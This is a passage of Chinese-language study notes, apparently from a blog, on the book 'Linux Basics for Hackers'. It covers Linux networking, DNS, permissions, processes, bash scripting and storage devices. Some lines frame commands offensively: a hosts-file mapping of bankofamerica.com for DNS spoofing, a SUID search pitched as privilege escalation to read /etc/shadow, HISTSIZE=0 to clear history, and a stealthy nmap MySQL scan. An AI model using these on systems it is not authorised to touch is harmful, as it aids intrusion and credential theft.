class="selector-pseudo">:11</span><span class="selector-pseudo">:22</span><span class="selector-pseudo">:33</span><span class="selector-pseudo">:44</span><span class="selector-pseudo">:55</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure><p>dhclient  eth0     从 DHCP服务器分配新的 IP地址</p><p>dig hackers-arise.com ns    (nameserver 的缩写）从一个域名服务器获取信息 </p><p>在 ADDITIONAL SECTION 部分，dig 查询显示了为 hackers­arise.com 提供服务的 DNS 服务 器的 IP 地址</p><p>dig hackers-arise.com mx    获取电子邮件服务器信息</p><p>更改DNS服务器</p><p>leafpad  /etc/resolv.conf         然后文中添加    nameserver 8.8.8.8 </p><p>or</p><p>echo  “nameserver  8.8.8.8”  &gt;&gt;  /etc/resolv.conf </p><p>（你的机器现在将转到 Google 公共 DNS 服务器来解析域名成 IP 地址。）</p><p>映射您自己的IP地址（你可以决定浏览器将访问哪个 IP 地址而不是让 DNS 服务决定）</p><p><strong>对于黑客，这对于劫持局域网上的 TCP 连接以使用 dnsspoof 等工具将流量定向到恶意 Web 服务 器非常有用。</strong> </p><p>192.168.181.131    bankofamerica.com （在 IP 地址和域名中间请确保你输入的是 TAB 键）</p><h2 id="添加或删除软件"><a href="#添加或删除软件" class="headerlink" title="添加或删除软件"></a>添加或删除软件</h2><p>apt-cache search [snort]     搜索软件包</p><p>apt-get  install  [snort]    添加软件</p><p>apt-get  remove  [snort]    删除软件    （不删除配置文件）</p><p>apt-get purge [snort ]    删除软件及其配置文件</p><p>apt-get update     更新系统</p><p>apt-get upgrade     升级库中的包</p><p>​            添加软件仓库到 SOURCES.LIST 文件 ：</p><p>​            kali &gt;leafpad  /etc/apt/sources.list </p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu trusty main  </span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu precise main</span></span><br></pre></td></tr></table></figure><p>​            其中</p><p>​            main     包含受支持的开源软件<br>​            universe     包含社区维护的开源软件<br>​            multiverse     包含受版权或其他法律问题限制的软件<br>​            restricted     包含专有设备驱动程序<br>​            backports     包含来自后续版本的</p><p> git clone url</p><h2 id="控制文件和目录权限"><a href="#控制文件和目录权限" class="headerlink" title="控制文件和目录权限"></a>控制文件和目录权限</h2><h3 id="权限："><a href="#权限：" class="headerlink" title="权限："></a>权限：</h3><p>必须为每个文件和目录分配使用它的不同身份的特定级别的权限。三个级别的许可如下： </p><p>r   读权限。赋予用户打开与查看权限<br>w  写权限。赋予用户查看与编辑写入权限<br>x  执行权限。赋予用户执行一个文件（但是没有必要查看或者编辑它）</p><p>通过这种方式，root 用户可以根据用户需要的权限向用户授予一定级别的权限。创建文件时，通常创 建文件的用户是文件的所有者，用户组是用户的当前组。该文件的所有者可以授予它各种访问权限。让我 们看看如何更改权限以将所有权赋予给单个用户和组。 </p><p>chown user filename    赋予个人用户权限</p><p>chgrp group filename    赋予用户组权限</p><h3 id="检查权限-ls-l"><a href="#检查权限-ls-l" class="headerlink" title="检查权限    ls -l"></a>检查权限    ls -l</h3><p>例：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;ls  –l  /usr/share/hashcat </span><br><span class="line">total<span class="number"> 32952 </span></span><br><span class="line">➊➋         ➌  ➍  ➎ ➏           ➐ </span><br><span class="line">drwxr-xr-x <span class="number"> 5 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 charsets </span><br><span class="line">­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hcstat </span><br><span class="line">­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hctune </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 masks </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 OpenCL </span><br><span class="line">drwxr -xr-x<span class="number"> 3 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 rules</span><br></pre></td></tr></table></figure><p>第一个字符告诉您文件类型，其中 d 代表目录，短划线（ - ）表示文件。<br>下一节定义文件的权限。有三组 三个 字符，由 read（r）， write（w）和 execute（x）的某种组合按顺 序组成。</p><p>第一组代表所有者的权限，第二组代表用户所在组的权限以及最后一个，所有其他用户的权限。 </p><p>无论您正在查看哪一组三个字母，如果您首先看到 r，该用户或用户组都有权打开和读取该文件或目录。 作为中间字母的 w 意味着它们可以写入（修改）文件或目录，并且最后的 x 意味着它们可以执行（或运行） 文件或目录。如果用短划线（ - ）替换任何 r，w 或 x，则未给出相应的权限。</p><table><thead><tr><th>二进制</th><th>十进制</th><th>权限(rwx)</th></tr></thead><tbody><tr><td>000</td><td>0</td><td>—</td></tr><tr><td>001</td><td>1</td><td>–x</td></tr><tr><td>010</td><td>2</td><td>-w-</td></tr><tr><td>011</td><td>3</td><td>-wx</td></tr><tr><td>100</td><td>4</td><td>r–</td></tr><tr><td>101</td><td>5</td><td>r-x</td></tr><tr><td>110</td><td>6</td><td>rw-</td></tr><tr><td>111</td><td>7</td><td>rwx</td></tr></tbody></table><p>chmod  774  hashcat.hcsta    更改文件权限（7 文件所有者权限  7 文件所有者所在组权限 4其他所有用户权限 ）</p><h3 id="UGO语法："><a href="#UGO语法：" class="headerlink" title="UGO语法："></a>UGO语法：</h3><p>输入 chmod 命令，然后输入要更改权限的用户，为用户提供 u，为组提供 g，为 其他用户提供 o，或者输入三个运算符之一： </p><p>-     移除一个权限 </p><p>+    添加一个权限 </p><p>=    设置一个权限 </p><p>在操作符之后，包括要添加或删除的权限（rwx），最后包含要应用它的文件的名称。 </p><p>例：</p><p>chmod  u-w  hashcat.hcstat         删除用户对 hashcat.hcstat 所属文件的写入权限</p><p>chmod u+x, o+x hashcat.hcstat     同时为用户和其他用户（不包括组）授予执行权限</p><p>Linux 自动分配基本权限（通常为文件 666 和目录 777）。</p><p>umask 方法表示要从文件或目录的基本权限中删除 的权限，以使其更安全。 </p><p>当创建新文件或目录时，它权限设置为默认值减去 umask 中的值</p><p>与大多数 Debian 系统一样，umask 预先配置为 022，这意味着 Kali 默认值为 644，文件为 755，目录为 755。 </p><h3 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h3><p>umask 值对于系统上的所有用户都不是通用的。每个用户都可以为其个人.profile 文件中的文件和目录 设置个人默认 umask 值。要以用户身份登录时查看当前值，只需输入命令 umask 并记下返回的内容。要更 改用户的 umask 值，请编辑该文件/home/username/.profile，例如，添加 umask 007 进行设置，以便只有所有者和用户组的成员才具有权限。 </p><h3 id="特别权限："><a href="#特别权限：" class="headerlink" title="特别权限："></a>特别权限：</h3><p>设置用户 ID（或 SUID）， 设置组 ID（或 SGID）</p><h4 id="使用-SUID授予临时-root权限"><a href="#使用-SUID授予临时-root权限" class="headerlink" title="使用 SUID授予临时 root权限"></a>使用 SUID授予临时 root权限</h4><p>正如您现在应该知道的那样，用户只有在有权执行该特定文件时才能执行该文件。如果用户只具有读 取和（或）写入权限，则无法执行。这可能看起来很简单，但这条规则有例外。<br>你可能遇到过这样一种情况：文件在被所有用户（即使非 root 用户）执行期间都需要 root 用户的权限。 例如，允许用户更改其密码的文件需要访问/etc/shadow（Linux 中保存用户密码的文件），该文件需要 root 用户权限才能执行。在这种情况下，通过在程序上设置 SUID 位，可以临时授予所有者执行文件所需的特权。<br>基本上，SUID 位表示任何用户都可以使用所有者的权限来执行该文件，但这些权限不会超出使用该文 件的范围。<br>要设置 SUID 位，请在常规权限之前输入 4，因此当设置 SUID 位时，具有 644 的新结果权限的文件表示为 4644</p><h4 id="使用-SGID授予-Root用户组权限"><a href="#使用-SGID授予-Root用户组权限" class="headerlink" title="使用 SGID授予 Root用户组权限"></a>使用 SGID授予 Root用户组权限</h4><p>SGID 授予临时权限，但它授予文件所有者组的权限，而不是文件所有者的权限。这意味着，设置 SGID 位，如果用户组有权执行该文件，没有执行权限的人也可以执行文件。<br>应用于目录时，SGID 位的工作方式略有不同：当该位置位时在目录中，在该目录中创建的新文件的所有权将转到目录创建者的组，而不是文件创建者的组。当多个用户共享目录时，这非常有用。该组中的所有用户都可以执行文件，而不仅仅是单个用户。<br>SGID 位在常规权限之前表示为 2，因此当 SGID 位置位时，具有结果权限 644 的新文件将表示为 2644。<br>同样，您可以使用 chmod 命令（例如，chmod 2644 filename） 。 </p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>作为黑客，您可以使用特别权限获取临时 root 权限并执行恶意操作，例如访问/etc/shadow 中的密码。 </p><p>在文件系统的任何位置查找对于 root 用户或其他 sysadmin，具有权限 4000（ SUID 位）的文件。</p><p>find  /  -user  root  -perm  -4000</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /usr/bin </span><br><span class="line">kali &gt;ls  -l </span><br><span class="line">­rwxr-xr-x <span class="number">1</span>  root  root  <span class="number">176272</span> Jul <span class="number">18</span> <span class="number">2018</span> stunnel4 </span><br><span class="line">­rwxr-xr-x <span class="number">1</span>  root  root   <span class="number">26696</span> Mar <span class="number">17</span> <span class="number">2018</span> sucrack </span><br><span class="line">➊-rwsr-xr-x <span class="number">1</span>  root root  <span class="number">140944</span> Jul <span class="number">5</span>  <span class="number">2018</span> sudo</span><br></pre></td></tr></table></figure><p> 请注意➊，所有者的第一组权限（具有 s 代替 x）。这就是 Linux 表示 SUID 位已设置的方式。这意味着 任何人跑sudo文件具有root用户的权限，这可能是系统管理员的安全问题，也可能是黑客的潜在攻击媒介。 </p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>查看进程</p><p>USER  进程用户<br>PID   进程 id<br>%CPU  CPU 占用率<br>75<br>%MEM  进程 CPU 占用率<br>COMMAND 进程名</p><p>通常，要对进程执行任何操作，我们必须指定其 PID。</p><p>通过进程名过滤进程</p><p>例：    ps  aux  |  grep  msfconsole </p><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>按使用的资源排序的进程显示 ，从最大的进程开始。与 ps 命令不同的是，top 命令每 10 秒动态刷新一次列表， 而 ps 命令只提供一次进程快照。</p><h3 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h3><p>在运行进程时设置优先级 </p><p>例：nice -n  -10  /bin/slowprocess </p><p>高 nice 值为低优先级，低 nice 值为高优先级</p><p>进程的所有者可以降低进程的 优先级，但不能增加其优先级。当然，超级用户或根用户可以随意将 nice 值设置为他们喜欢的任何值。 </p><h3 id="renice"><a href="#renice" class="headerlink" title="renice"></a>renice</h3><p>例：renice  20  [PID]6996             </p><p>与 nice 一样，只有 root 用户可以将进程重新设置为负值以赋予其更高的优先级，但任何用户都可以使 用 renice 来降低优先级。 </p><h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>命令：kill -signal PID</p><p>SIGHUP 1<br>这称为挂起（HUP）标志信号。它会停 止指定的进程并使用相同的PID重新启 动它。<br>SIGINT 2<br>这是中断（INT）信号。这是一个弱信 号，不能保证工作，但它在大多数情 况下都有效。<br>SIGQUIT 3<br>这称为核心转储。它终止进程并将进 程信息保存在内存中，然后将此信息 保存在当前工作目录中的一个名为 core 的文件中。（这样做的原因超出 了本书的范围。）<br>SIGTERM 15<br>这是终止（TERM）信号。这是 kill 命令的默认 kill 信号。<br>SIGKILL 9<br>这是强制终止信号。它通过将进程的 资源发送到特殊位置/dev/null 来强 制进程停止。<br>使</p><p>如果您不知道进程的 PID，则可以使用 killall 命令终止进程。此命令将进程的名称（而不是 PID）作为参 数。</p><h3 id="在后台运行进程"><a href="#在后台运行进程" class="headerlink" title="在后台运行进程"></a>在后台运行进程</h3><p>要在后台启动进程，只需在命令末尾添加一个与号（＆），</p><p>例:    leafpad  newscript  &amp; </p><h3 id="把后台运行的进程移到前台"><a href="#把后台运行的进程移到前台" class="headerlink" title="把后台运行的进程移到前台"></a>把后台运行的进程移到前台</h3><p>命令：fg PID</p><h3 id="定时执行程序"><a href="#定时执行程序" class="headerlink" title="定时执行程序"></a>定时执行程序</h3><p><strong>at</strong></p><p>当您使用指定的时间进入 at 守护进程时，进入交互模式时，您会看到 at&gt;提示符。您可以在此处输入 要在指定时间执行的命令： </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="keyword">at</span>  <span class="number">7</span>:<span class="number">20</span>am </span><br><span class="line"><span class="keyword">at</span> &gt;/root/myscanningscript</span><br></pre></td></tr></table></figure><p>at 命令是守护进程（后台进程）对于将作业安排在将来的某个时刻运行一次非常有用。</p><p>crond 更适合于 安排任务每天，每周或每月发生。</p><h3 id="管理用户环境变量"><a href="#管理用户环境变量" class="headerlink" title="管理用户环境变量"></a>管理用户环境变量</h3><p>env    查看所有默认环境变量</p><p>set | more     要查看所有环境变量，包括 shell 变量、本地变量和 shell 函数(如任何用户定义的变量和命令别名)</p><p>set | grep HISTSIZE     特定变量的过滤</p><p>HISTSIZE=0     暂时更改会话的变量值</p><p>export HISTSIZE     永久更改会话的变量值（更改后 export）</p><p>找点乐子：</p><p>​        PS1=”World’s Best Hacker: #” </p><p>​        export PS1 </p><p>PS1 变量有一组占位符，用于显示希 望在提示符中显示的信息，包括以下内容: \u  当前用户的名称 \h  主机名 \W  当前工作目录的基本名称 </p><h3 id="添加到PATH变量"><a href="#添加到PATH变量" class="headerlink" title="添加到PATH变量"></a>添加到PATH变量</h3><p>PATH=$PATH:/root/newhackingtool </p><h3 id="创建用户定义的变量"><a href="#创建用户定义的变量" class="headerlink" title="创建用户定义的变量"></a>创建用户定义的变量</h3><p>语法很简单：输入变量的名称，后面跟着赋值符号(=)，然后输入变量的值，如下所示: </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;MYNEWVARIABLE=<span class="comment">"Hacking is the most valuable skill set in the 21st century</span></span><br><span class="line">kali &gt;<span class="keyword">echo</span> $MYNEWVARIABLE </span><br><span class="line">Hacking <span class="keyword">is</span> the most valuable skill <span class="keyword">set</span> in the <span class="number">21</span><span class="keyword">st</span> century</span><br></pre></td></tr></table></figure><p>就像我们的系统环境变量一样，必须导出用户定义的变量才能将其持久化到新的会话中。 </p><p>如果要删除这个新变量或任何变量，请使用 unset 命令。不过，在删除系统变量之前一定要三思，因 为之后系统的操作可能会大不相同。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="built_in">unset</span> MYNEWVARIABLE </span><br><span class="line">kali &gt;<span class="built_in">echo</span> <span class="variable">$MYNEWVARIABLE</span> </span><br><span class="line">kali &gt;</span><br></pre></td></tr></table></figure><p>如您所见，当您输入 unset  MYNEWVARIABLE 时，您将删除该变量及其值。如果在同一个变量上使用 echo，Linux 现在将返回空行。</p><h2 id="简单BASH-脚本编程"><a href="#简单BASH-脚本编程" class="headerlink" title="简单BASH 脚本编程"></a>简单BASH 脚本编程</h2><p>#!        告诉您的操作系统您想为脚本使用哪个解释器。</p><p>然后按照指示的 (#!/bin/bash)操作系统使用 bash shell 解释器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➊ <span class="comment">#! /bin/bash </span></span><br><span class="line"> </span><br><span class="line">➋ <span class="comment"># This is your second bash script. In this one, you prompt /  </span></span><br><span class="line"><span class="comment"># the user for input, place the input in a variable, and / </span></span><br><span class="line"><span class="comment"># display the variable contents in a string. </span></span><br><span class="line"> </span><br><span class="line">➌ <span class="built_in">echo</span> <span class="string">"What is your name?"</span>  </span><br><span class="line"><span class="built_in">read</span> name </span><br><span class="line">➍ <span class="built_in">echo</span> <span class="string">"What chapter are you on in Linux Basics for Hackers?"</span>  </span><br><span class="line"><span class="built_in">read</span> chapter </span><br><span class="line">➎ <span class="built_in">echo</span> <span class="string">"Welcome"</span> <span class="variable">$name</span> <span class="string">"to Chapter"</span> <span class="variable">$chapter</span> <span class="string">"of Linux Basics for Hackers!"</span></span><br></pre></td></tr></table></figure><p>我们从#!/bin/bash 开始，告诉系统要使用这个脚本➊bash 解释器。然后添加一个注释描述脚本➋及其 功能。之后,我们提示用户输入他们的名字，➌问解释器我们的名字，读取输入并将其转换成一个变量 name。 然后我们提示用户输入他们目前正在这本书中的所在章节，➍我们再次读取键盘输入一个变量，这个章节 叫 chapter。<br>在最后一行中，我们构造一个输出字符串，➎欢迎读者（他们的名字）在此书的所在章节。我们使用 echo 命令，并用双引号提供要在屏幕上显示的文本。然后，为了填写用户输入的名称和章号，我们将变量 添加到消息中应该出现的位置。如第 7 章所述，要使用变量中包含的值，必须在变量名前面加上$符号。<br>将此文件保存为 WelcomeScript.sh 文件。其中.sh 扩展名是脚本文件的约定。您可能已经注意到，我们 没有包含前面的扩展名，这并不是严格要求的，如果您关闭扩展名，该文件将默认保存为 shell 脚本文件。<br>现在，让我们运行这个脚本。不要忘记先用 chmod 给其执行权限</p><p>nmap:</p><p>nmap  -sT  192.168.181.1  -p  3306     对地址 192.168.181.1 执行 TCP 扫描，查看端口 3306 (MySQL 的默认端口)是否打开， </p><h3 id="一个简单的扫描器"><a href="#一个简单的扫描器" class="headerlink" title="一个简单的扫描器"></a>一个简单的扫描器</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➊ #! /bin/bash </span><br><span class="line">➋ # This<span class="built_in"> script </span>is designed <span class="keyword">to</span> <span class="builtin-name">find</span> hosts with MySQL installed </span><br><span class="line">nmap ➌-sT 192.168.181.0/24 ➍-p 3306 ➎&gt;/dev/<span class="literal">null</span> ➏-oG MySQLscan </span><br><span class="line">➐ cat MySQLscan | grep open &gt; MySQLscan2 ➑ </span><br><span class="line"> </span><br><span class="line">cat MySQLscan2</span><br></pre></td></tr></table></figure><p>➊我们使用标识符#！开始。➋让我们遵循这个注释来解释脚本的用途。<br>现在，让我们使用➌nmap 命令 TCP 扫描局域网，寻找端口 3306➍。(请注意，您的 IP 地址在您的终端 中可能不同，请使用 Linux 上的 ifconfig 命令或 Windows 上的 ipconfig 命令来确定您的 IP 地址。) 为了保持 隐秘，我们还发送通常会出现在屏幕上的标准 nmap 输出到 Linux 的一个特殊的地方➎，一个特殊的地方在 Linux 中消失。我们在本地机器上做这个，所以这并不重要，但如果要远程使用脚本，则需要隐藏 nmap 输 出。然后，我们将扫描的输出发送到一个名为 MySQLscan 的文件➏，格式为 grep 格式，这意味着 grep 可以 处理的格式。 </p><p>下一行显示我们存储输出的 MySQLscan 文件，➐然后输出到 grep 的管道，以过滤包含关键字 open（端 口开放）的所在行。然后我们把这些字符行放到一个命名为 MySQLscan2 的文件中➑。 </p><h4 id="注：这里只对bash进行简单的介绍。"><a href="#注：这里只对bash进行简单的介绍。" class="headerlink" title="注：这里只对bash进行简单的介绍。"></a>注：这里只对bash进行简单的介绍。</h4><p>内置 Bash 命令<br>命令    功能<br>：     返回 0 或 true<br>.     执行 shell 脚本<br>b     将作业放在后台<br>break     退出当前循环<br>cd     改变目录<br>continue     执行当前循环<br>echo     显示命令参数<br>eval     计算以下表达式<br>exec     在不创建新进程的情况下执行以下命令<br>exit     退出 shell<br>export     使变量或函数对其他程序可用<br>fg     将工作放在前台<br>getopts     解析 shell 脚本的参数<br>jobs     列出后台(bg)执行的工作<br>Pwd     显示当前目录<br>Read     从标准输入读取一行<br>Readonly     将变量声明为只读<br>set     列出所有变量<br>shift     将参数向左移动<br>test     评估参数<br>[     执行条件测试<br>times     打印用户和系统时间<br>trap     追踪一个信号<br>type     显示如何将每个参数解释为一个命令<br>umask     更改新文件的默认权限<br>unset     从变量或函数中删除值<br>wait     等待后台进程完成</p><h2 id="压缩和归档"><a href="#压缩和归档" class="headerlink" title="压缩和归档"></a>压缩和归档</h2><h3 id="归档"><a href="#归档" class="headerlink" title="归档"></a>归档</h3><p>tar  -cvf  HackersArise.tar  hackersarise1  hackersarise2  hackersarise3 </p><p>归档命令是 tar，我们在这里使用它有三个参数选项。c 选项表 示创建，v(代表详细过程，是可选的)列出 tar 正在处理的文件，f 表示写入以下一个文件。最后一个选项也 适用于从文件中读取。然后，我们为新归档文件提供您希望从这三个脚本来创建的文件名:HackersArise.tar。</p><p>tar  -tvf  HackersArise.tar         使用 tar 命令和-t 内容列表参数从 tar 包中显示这些文件，而不需要提取它们，</p><p>tar  -xvf  HackersArise.tar         使用 tar 命令和-x (extract)选项从 tar 包中提取这些文件</p><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>​                        </p><table><thead><tr><th>压缩方式</th><th>压缩文件</th><th>解压文件</th></tr></thead><tbody><tr><td>• bzip2，它使用扩展名.tar.bz2</td><td>bzip2  HackersArise.*</td><td>bunzip2  HackersArise.*</td></tr><tr><td>• compress，它使用扩展名.tar.Z</td><td>compress  HackersArise.*</td><td>uncompress  HackersArise.*</td></tr><tr><td>• gzip，它使用扩展名.tar.gz 或.tgz</td><td>gzip  HackersArise.*</td><td>gunzip  HackersArise.*</td></tr></tbody></table><h3 id="创建存储设备的逐位或物理副本"><a href="#创建存储设备的逐位或物理副本" class="headerlink" title="创建存储设备的逐位或物理副本"></a>创建存储设备的逐位或物理副本</h3><p>dd 命令的基本语法如下: </p><p>dd if=inputfile of=outputfile </p><p>dd 是指定输入文件的物理“复制”命令，</p><p>/dev/sdb 表示指定输出文件的/dev 目录下的闪存驱动器，</p><p>/root/flashcopy 是要将物理副本复制到的文件的名称</p><p>dd  if=/dev/media  of=/root/flashcopy  bs=4096  conv:noerror</p><p>dd 命令可以使用许多参数选项，您可以对这些选项进行一些研究，但其中最有用的是 noerror 选项和 bs(块大小)选项。顾名思义，即使遇到错误，noerror 选项也会继续复制。bs 选项允许您确定要复制的数 据的块大小(每个块的读/写字节数)。默认情况下，它被设置为 512 字节，但是可以更改它以加快进度。通 常，这将设置为设备的扇区大小，通常为 4KB(4096 字节)。</p><h2 id="文件系统和存储设备管理"><a href="#文件系统和存储设备管理" class="headerlink" title="文件系统和存储设备管理"></a>文件系统和存储设备管理</h2><h3 id="设备目录-DEV"><a href="#设备目录-DEV" class="headerlink" title="设备目录/DEV"></a>设备目录/DEV</h3><p>Linux 有一个特殊的目录，其中包含代表每个附加设备的文件：适当命名的/dev 目录。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /dev </span><br><span class="line">kali &gt;ls  -l total<span class="number"> 0 </span></span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,175 May<span class="number"> 16 </span>12:44 agpgart </span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,235 May<span class="number"> 16 </span>12:44 autofs </span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span> root root<span class="number"> 160 </span>May<span class="number"> 16 </span>12:44 block </span><br><span class="line">­­snip-- </span><br><span class="line">lrwxrwxrwx  <span class="number"> 1 </span> root root<span class="number"> 3 </span>May<span class="number"> 16 </span>12:44 cdrom -&gt; sr0 </span><br><span class="line">­­snip-- </span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span> root root<span class="number"> 60 </span>May<span class="number"> 16 </span>12:44 cpu </span><br><span class="line">­­snip--</span><br></pre></td></tr></table></figure><p>使用带有 fdisk 的-l 参数列出所有驱动器的所有分区，</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fdisk  -l </span><br><span class="line">Disk /dev/sda: 20GiB,<span class="number"> 21474836480 </span>bytes,<span class="number"> 41943040 </span>sectors  </span><br><span class="line">108 </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes </span><br><span class="line">  </span><br><span class="line">Disk label type: dos </span><br><span class="line">Disk identifier: 0x7c06cd70 </span><br><span class="line"> </span><br><span class="line">Device Boot Start End   Sectors Size Id Type </span><br><span class="line">/dev/sda1 *<span class="number"> 2048 </span>39174143<span class="number"> 39172096 </span>18.7G<span class="number"> 83 </span>Linux </span><br><span class="line">/dev/sda2<span class="number"> 39176190 </span><span class="number"> 41940991 </span> <span class="number"> 2764802 </span>1.3G<span class="number"> 5 </span>Extended </span><br><span class="line">/dev/sda5<span class="number"> 39176192 </span><span class="number"> 41940991 </span> <span class="number"> 2764800 </span>1.3G<span class="number"> 82 </span>Linux swap / Solaris </span><br><span class="line"> </span><br><span class="line">Disk /dev/sdb: 29.8 GiB,<span class="number"> 31999393792 </span>bytes,<span class="number"> 62498816 </span>sectors </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes Disk label type: dos </span><br><span class="line">Disk identifier: 0xc3072e18 </span><br><span class="line"> </span><br><span class="line">Device Boot  Start End Sectors Size Id Type </span><br><span class="line">/dev/sdb1<span class="number"> 32 </span>62498815<span class="number"> 62498784 </span>29.8G<span class="number"> 7 </span>HPFS/NTFS/exFAT</span><br></pre></td></tr></table></figure><p>设备 sda1、sda2 和 sda5 在第一节中列出。这三种设备构成了我的虚拟机的虚拟磁 盘，它是一个 20GB 的驱动器，有三个分区，包括交换分区(sda5)，当 RAM 容量超过时，它充当虚拟 RAM —类似于 Windows 中的虚拟页面文件。<br>向下扫描到第三节，您将看到指定为 sdb -的第二个设备输出，b 标签告诉我们这个驱 动器与前三个设备是分开的。这是我的 64GB 闪存。注意，fdisk 表示它是 HPFS/NTFS/ExFAT 文件系统类型。 这些文件类型——高性能文件系统(HPFS)、新技术文件系统(NTFS)和扩展文件分配表(exFAT)——不是 Linux 系统的本机文件，而是 macOS 和 Windows 系统的。在进行研究时，能够识别不同系统的原生文件类型是值 得的。文件系统可能指出驱动器的格式设置在哪种机器上，这是有价值的信息。Kali 能够使用在许多不同操 作系统上创建的 USB 闪存驱动器。<br>正如您在第 1 章中看到的，Linux 文件系统的结构与 Windows 和其他专有操作系统有很大的不同。最重 要的是，Linux 中文件的存储和管理方式也不同。新版本的 Windows 使用 NTFS 文件系统，而旧的 Windows<br>109<br>系统使用文件分配表(FAT)系统。<br>Linux 使用许多不同类型的文件系统，但最常见的是 ext2、ext3 和 ext4。这些都是 ext(或扩展的)文件系 统的升级版，ext4 是最新的。 </p><h3 id="字符和块设备"><a href="#字符和块设备" class="headerlink" title="字符和块设备"></a>字符和块设备</h3><p>关于/dev 目录中设备文件的命名，还需要注意的是，第一个位置包含 c 或 b。您可以在清单 10-1 的大 多数条目开头看到这一点，它看起来像这样: </p><p>这些字母代表设备输入和输出数据的两种方式。c 代表字符，如您所料，这些设备被称为字符设备。通 过逐个字符(如鼠标或键盘)发送和接收数据与系统交互的外部设备是字符设备。 </p><p>b 代表第二种类型:块设备。它们以数据块(一次多个字节)进行通信，包括硬盘驱动器和 DVD 驱动器等 设备。这些设备需要更高的数据吞吐量，因此以块(一次多个字符或字节)的形式发送和接收数据。一旦您知 道一个设备是字符设备还是块设备，您就可以轻松地获得关于它的更多信息。</p><h3 id="使用-lsblk列出-块设备和信息"><a href="#使用-lsblk列出-块设备和信息" class="headerlink" title="使用 lsblk列出 块设备和信息"></a>使用 lsblk列出 